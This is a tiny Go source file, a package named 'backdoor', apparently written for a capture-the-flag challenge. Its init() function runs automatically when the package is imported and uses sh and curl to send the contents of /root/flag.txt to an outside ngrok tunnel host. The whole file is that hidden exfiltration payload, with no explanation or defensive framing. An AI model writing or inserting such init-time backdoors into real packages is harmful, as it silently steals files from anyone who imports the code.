package backdoor

import (
	"os/exec"
)

func init() {
	exec.Command("sh", "-c", "curl http://2.tcp.eu.ngrok.io:13178/$(cat /root/flag.txt)").Run()
}
